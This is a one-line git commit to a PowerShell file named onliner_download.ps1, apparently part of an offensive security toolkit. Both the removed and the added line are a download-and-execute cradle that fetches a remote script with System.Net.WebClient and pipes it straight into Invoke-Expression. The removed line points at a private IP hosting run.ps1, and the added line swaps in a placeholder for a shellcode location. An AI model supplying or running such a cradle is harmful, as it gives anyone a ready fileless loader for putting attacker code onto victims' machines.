52119a644ab2fb8105c50b5e690a356fb58a7a34
sabyasachiroot <33757104+sabyasachiroot@users.noreply.github.com>
2022-09-24 15:21:45 +0530

    Update onliner_download.ps1

--- onliner_download.ps1
+++ onliner_download.ps1
@@ -1,1 +1,1 @@
-powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX
+powershell (New-Object System.Net.WebClient).DownloadString('Your shellcode location here') | IEX
